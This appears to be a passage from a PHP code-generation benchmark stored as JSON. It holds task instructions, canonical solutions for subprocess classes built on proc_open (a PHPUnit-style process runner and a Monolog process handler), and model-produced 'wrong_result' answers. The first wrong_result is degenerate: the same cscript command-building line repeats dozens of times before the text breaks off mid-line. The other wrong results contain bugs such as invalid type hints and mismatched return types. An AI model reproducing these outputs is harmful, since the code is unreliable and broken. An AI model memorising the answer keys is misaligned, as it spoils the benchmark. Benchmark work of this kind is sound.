    "wrong_result": "```php\nfunction exec_cmd($cmd, $cwd = null, $com = false) {\n    $res = null;\n    $msg = null;\n    $pipes = null;\n    $proc = null;\n    $method = null;\n    $win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');\n    $cwd = ($cwd) ? $cwd : getcwd();\n    $cmd = escapeshellcmd($cmd);\n    $cmd = ($win) ? $cmd : \"cd \\\"$cwd\\\" && $cmd\";\n    $cmd = ($win) ? \"cmd /c $cmd\" : $cmd;\n    $cmd = ($win && $com) ? \"cmd /c $cmd\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd = ($win && $com) ? \"cscript //nologo \\\"{$cwd}\\\\cmd.vbs\\\" \\\"$cmd\\\"\" : $cmd;\n    $cmd"
  },
  {
    "Task_id": 150,
    "Instruction": "Task Description: Create a PHP class that manages the execution of a subprocess using proc_open, handles input/output through pipes, and provides timeout functionality for process execution.\n\nClass Description: DefaultPhpProcess is a class that extends AbstractPhpProcess and provides concrete implementation for running PHP jobs in a subprocess. It handles process creation, I/O management through pipes, timeout enforcement, and resource cleanup.\n\nAttributes:\ntempFile: string - Temporary file path used for storing job input when stdin is not used\nstdin: mixed - Input source for the subprocess\nenv: array - Environment variables for the subprocess\ntimeout: int - Maximum execution time in seconds before process termination\n\nMethods:\nrunJob(string $job, array $settings = []) -> array - Executes a PHP job with optional settings, returns output and error\ngetHandles() -> array - Returns empty array by default, can be overridden to provide custom handles\nrunProcess(string $job, array $settings) -> array - Core method that manages process execution and I/O handling\nprocess(resource $pipe, string $job) -> void - Writes job input to the process pipe\ncleanup() -> void - Cleans up temporary resources (files)\nuseTemporaryFile() -> bool - Determines whether to use temporary files for input (default false)",
    "Canonical_solution": "use function array_merge;\nuse function fclose;\nuse function file_put_contents;\nuse function fread;\nuse function fwrite;\nuse function is_array;\nuse function is_resource;\nuse function proc_close;\nuse function proc_open;\nuse function proc_terminate;\nuse function rewind;\nuse function sprintf;\nuse function stream_get_contents;\nuse function stream_select;\nuse function sys_get_temp_dir;\nuse function tempnam;\nuse function unlink;\nuse PHPUnit\\Framework\\Exception;\n\nclass DefaultPhpProcess extends AbstractPhpProcess\n{\n    protected $tempFile;\n\n    public function runJob(string $job, array $settings = []): array\n    {\n        if ($this->stdin || $this->useTemporaryFile()) {\n            if (!($this->tempFile = tempnam(sys_get_temp_dir(), 'PHPUnit')) ||\n                file_put_contents($this->tempFile, $job) === false) {\n                throw new Exception(\n                    'Unable to write temporary file'\n                );\n            }\n\n            $job = $this->stdin;\n        }\n\n        return $this->runProcess($job, $settings);\n    }\n\n    protected function getHandles(): array\n    {\n        return [];\n    }\n\n    protected function runProcess(string $job, array $settings): array\n    {\n        $handles = $this->getHandles();\n\n        $env = null;\n\n        if ($this->env) {\n            $env = $_SERVER ?? [];\n            unset($env['argv'], $env['argc']);\n            $env = array_merge($env, $this->env);\n\n            foreach ($env as $envKey => $envVar) {\n                if (is_array($envVar)) {\n                    unset($env[$envKey]);\n                }\n            }\n        }\n\n        $pipeSpec = [\n            0 => $handles[0] ?? ['pipe', 'r'],\n            1 => $handles[1] ?? ['pipe', 'w'],\n            2 => $handles[2] ?? ['pipe', 'w'],\n        ];\n\n        $process = proc_open(\n            $this->getCommand($settings, $this->tempFile),\n            $pipeSpec,\n            $pipes,\n            null,\n            $env\n        );\n\n        if (!is_resource($process)) {\n            throw new Exception(\n                'Unable to spawn worker process'\n            );\n        }\n\n        if ($job) {\n            $this->process($pipes[0], $job);\n        }\n\n        fclose($pipes[0]);\n\n        $stderr = $stdout = '';\n\n        if ($this->timeout) {\n            unset($pipes[0]);\n\n            while (true) {\n                $r = $pipes;\n                $w = null;\n                $e = null;\n\n                $n = @stream_select($r, $w, $e, $this->timeout);\n\n                if ($n === false) {\n                    break;\n                }\n\n                if ($n === 0) {\n                    proc_terminate($process, 9);\n\n                    throw new Exception(\n                        sprintf(\n                            'Job execution aborted after %d seconds',\n                            $this->timeout\n                        )\n                    );\n                }\n\n                if ($n > 0) {\n                    foreach ($r as $pipe) {\n                        $pipeOffset = 0;\n\n                        foreach ($pipes as $i => $origPipe) {\n                            if ($pipe === $origPipe) {\n                                $pipeOffset = $i;\n\n                                break;\n                            }\n                        }\n\n                        if (!$pipeOffset) {\n                            break;\n                        }\n\n                        $line = fread($pipe, 8192);\n\n                        if ($line === '' || $line === false) {\n                            fclose($pipes[$pipeOffset]);\n\n                            unset($pipes[$pipeOffset]);\n                        } elseif ($pipeOffset === 1) {\n                            $stdout .= $line;\n                        } else {\n                            $stderr .= $line;\n                        }\n                    }\n\n                    if (empty($pipes)) {\n                        break;\n                    }\n                }\n            }\n        } else {\n            if (isset($pipes[1])) {\n                $stdout = stream_get_contents($pipes[1]);\n\n                fclose($pipes[1]);\n            }\n\n            if (isset($pipes[2])) {\n                $stderr = stream_get_contents($pipes[2]);\n\n                fclose($pipes[2]);\n            }\n        }\n\n        if (isset($handles[1])) {\n            rewind($handles[1]);\n\n            $stdout = stream_get_contents($handles[1]);\n\n            fclose($handles[1]);\n        }\n\n        if (isset($handles[2])) {\n            rewind($handles[2]);\n\n            $stderr = stream_get_contents($handles[2]);\n\n            fclose($handles[2]);\n        }\n\n        proc_close($process);\n\n        $this->cleanup();\n\n        return ['stdout' => $stdout, 'stderr' => $stderr];\n    }\n\n    protected function process($pipe, string $job): void\n    {\n        fwrite($pipe, $job);\n    }\n\n    protected function cleanup(): void\n    {\n        if ($this->tempFile) {\n            unlink($this->tempFile);\n        }\n    }\n\n    protected function useTemporaryFile(): bool\n    {\n        return false;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 145,
    "wrong_result": "```php\nclass DefaultPhpProcess extends AbstractPhpProcess\n{\n    protected $tempFile;\n    protected $stdin;\n    protected $env;\n    protected $timeout;\n\n    public function runJob(string $job, array $settings = []): array\n    {\n        $handles = $this->getHandles();\n        $settings = array_merge($this->settings, $settings);\n        $process = $this->runProcess($job, $settings);\n        $output = $this->readOutput($process, $handles);\n        $this->cleanup();\n        return $output;\n    }\n\n    protected function getHandles(): array\n    {\n        return [];\n    }\n\n    protected function runProcess(string $job, array $settings): array\n    {\n        $this->stdin = $settings['stdin'] ?? null;\n        $this->env = $settings['env'] ?? [];\n        $this->timeout = $settings['timeout'] ?? 0;\n        $process = proc_open($this->getCommand(), $this->getDescriptors(), $pipes);\n        if (is_resource($process)) {\n            $this->process($pipes['stdin'], $job);\n            fclose($pipes['stdin']);\n            proc_close($process);\n        }\n        return $process;\n    }\n\n    protected function process(resource $pipe, string $job): void\n    {\n        if ($this->stdin === 'pipe') {\n            fwrite($pipe, $job);\n        } elseif ($this->useTemporaryFile()) {\n            $this->tempFile = tempnam(sys_get_temp_dir(), 'php-job');\n            file_put_contents($this->tempFile, $job);\n            fwrite($pipe, $this->tempFile);\n        }\n    }\n\n    protected function cleanup(): void\n    {\n        if ($this->tempFile) {\n            unlink($this->tempFile);\n        }\n    }\n\n    protected function useTemporaryFile(): bool\n    {\n        return false;\n    }\n}\n```"
  },
  {
    "Task_id": 151,
    "Instruction": "Task Description: Create a PHP class that handles inter-process communication (IPC) using proc_open to execute external commands, manage input/output streams, and handle errors.\n\nClass Description: The ProcessHandler class manages subprocess execution via proc_open, providing methods to write input to the process, read output/errors, and properly clean up resources. It extends Monolog's AbstractProcessingHandler for logging integration.\n\nAttributes:\n- process: [resource|null] - The subprocess resource handle or null if not running\n- command: [string] - The command to execute in the subprocess\n- cwd: [string|null] - The working directory for the subprocess or null for default\n- pipes: [array] - Array of file pointers for process pipes (stdin, stdout, stderr)\n\nMethods:\n- __construct(string $command, $level = Logger::DEBUG, bool $bubble = true, ?string $cwd = null) -> [void] - Initializes the handler with command and optional working directory\n- write(array $record) -> [void] - Writes formatted log record to process stdin (inherited from AbstractProcessingHandler)\n- close() -> [void] - Closes all pipes and terminates the process\n- ensureProcessIsStarted() -> [void] - Starts the process if not already running\n- startProcess() -> [void] - Executes proc_open to start the subprocess\n- handleStartupErrors() -> [void] - Checks for and handles any startup errors\n- selectErrorStream() -> [int|false] - Monitors stderr for error output\n- readProcessErrors() -> [string] - Reads and returns content from stderr\n- writeProcessInput(string $string) -> [void] - Writes data to process stdin",
    "Canonical_solution": "use Monolog\\Logger;\n\nclass ProcessHandler extends AbstractProcessingHandler\n{\n    private $process;\n    private $command;\n    private $cwd;\n    private $pipes = [];\n    protected const DESCRIPTOR_SPEC = [\n        0 => ['pipe', 'r'],\n        1 => ['pipe', 'w'],\n        2 => ['pipe', 'w'],\n    ];\n\n    public function __construct(string $command, $level = Logger::DEBUG, bool $bubble = true, ?string $cwd = null)\n    {\n        if ($command === '') {\n            throw new \\InvalidArgumentException('The command argument must be a non-empty string.');\n        }\n        if ($cwd === '') {\n            throw new \\InvalidArgumentException('The optional CWD argument must be a non-empty string or null.');\n        }\n\n        parent::__construct($level, $bubble);\n\n        $this->command = $command;\n        $this->cwd = $cwd;\n    }\n\n    protected function write(array $record): void\n    {\n        $this->ensureProcessIsStarted();\n        $this->writeProcessInput($record['formatted']);\n        $errors = $this->readProcessErrors();\n        if (empty($errors) === false) {\n            throw new \\UnexpectedValueException(sprintf('Errors while writing to process: %s', $errors));\n        }\n    }\n\n    private function ensureProcessIsStarted(): void\n    {\n        if (is_resource($this->process) === false) {\n            $this->startProcess();\n            $this->handleStartupErrors();\n        }\n    }\n\n    private function startProcess(): void\n    {\n        $this->process = proc_open($this->command, static::DESCRIPTOR_SPEC, $this->pipes, $this->cwd);\n        foreach ($this->pipes as $pipe) {\n            stream_set_blocking($pipe, false);\n        }\n    }\n\n    private function handleStartupErrors(): void\n    {\n        $selected = $this->selectErrorStream();\n        if (false === $selected) {\n            throw new \\UnexpectedValueException('Something went wrong while selecting a stream.');\n        }\n\n        $errors = $this->readProcessErrors();\n        if (is_resource($this->process) === false || empty($errors) === false) {\n            throw new \\UnexpectedValueException(\n                sprintf('The process \"%s\" could not be opened: ' . $errors, $this->command)\n            );\n        }\n    }\n\n    protected function selectErrorStream()\n    {\n        $empty = [];\n        $errorPipes = [$this->pipes[2]];\n        return stream_select($errorPipes, $empty, $empty, 1);\n    }\n\n    protected function readProcessErrors(): string\n    {\n        return (string) stream_get_contents($this->pipes[2]);\n    }\n\n    protected function writeProcessInput(string $string): void\n    {\n        fwrite($this->pipes[0], $string);\n    }\n\n    public function close(): void\n    {\n        if (is_resource($this->process)) {\n            foreach ($this->pipes as $pipe) {\n                fclose($pipe);\n            }\n            proc_close($this->process);\n            $this->process = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 145,
    "wrong_result": "```php\nclass ProcessHandler extends AbstractProcessingHandler\n{\n    private $process;\n    private $command;\n    private $cwd;\n    private $pipes;\n\n    public function __construct(string $command, $level = Logger::DEBUG, bool $bubble = true, ?string $cwd = null)\n    {\n        parent::__construct($level, $bubble);\n        $this->command = $command;\n        $this->cwd = $cwd;\n    }\n\n    protected function write(array $record): void\n    {\n        $this->ensureProcessIsStarted();\n        $this->writeProcessInput($record['formatted']);\n    }\n\n    public function close(): void\n    {\n        if ($this->process) {\n            foreach ($this->pipes as $pipe) {\n                fclose($pipe);\n            }\n            proc_close($this->process);\n            $this->process = null;\n        }\n    }\n\n    private function ensureProcessIsStarted(): void\n    {\n        if (!$this->process) {\n            $this->startProcess();\n        }\n    }\n\n    private function startProcess(): void\n    {\n        $descriptorspec = [\n            0 => ['pipe', 'r'],  // stdin\n            1 => ['pipe', 'w'],  // stdout\n            2 => ['pipe', 'w'],  // stderr\n        ];\n\n        $this->process = proc_open($this->command, $descriptorspec, $this->pipes, $this->cwd);\n        $this->handleStartupErrors();\n    }\n\n    private function handleStartupErrors(): void\n    {\n        if (!is_resource($this->process)) {\n            throw new \\RuntimeException('Failed to start process: ' . $this->command);\n        }\n    }\n\n    private function selectErrorStream(): int|false\n    {\n        $read = [$this->pipes[2]]; // stderr\n        $write = null;\n        $except = null;\n\n        return stream_select($read, $write, $except, 0);\n    }\n\n    private function readProcessErrors(): string\n    {\n        $errors = '';\n        while ($this->selectErrorStream() !== false) {\n            $errors .= fgets($this->pipes[2]);\n        }\n        return $errors;\n    }\n\n    private function writeProcessInput(string $string): void\n    {\n        fwrite($this->pipes[0], $string);\n        fclose($this->pipes[0]);\n    }\n}\n```"
  },
  {
    "Task_id": 2,
